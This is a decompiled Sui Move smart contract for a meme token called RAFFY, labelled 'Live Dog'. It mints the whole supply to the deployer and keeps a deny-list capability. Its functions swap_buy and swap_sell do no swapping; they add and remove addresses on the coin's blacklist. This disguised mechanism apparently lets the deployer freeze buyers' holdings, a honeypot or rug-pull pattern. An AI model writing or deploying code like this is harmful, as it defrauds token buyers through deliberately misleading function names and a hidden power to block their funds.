module 0x33d6ef73e9ffa81d252cbddb50ddf60efae5b6998f60e2d31aa2f6d7e7ceb466::raffy {
    struct RAFFY has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: RAFFY, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<RAFFY>(arg0, 9, b"RAFFY", b"Live Dog", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmQjwtXKFb59GyDYZxZcYAKCRPZcFZZwAnxdpo7d9Vspjr"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<RAFFY>(&mut v3, 420690000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<RAFFY>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<RAFFY>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<RAFFY>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<RAFFY>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<RAFFY>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<RAFFY>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<RAFFY>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

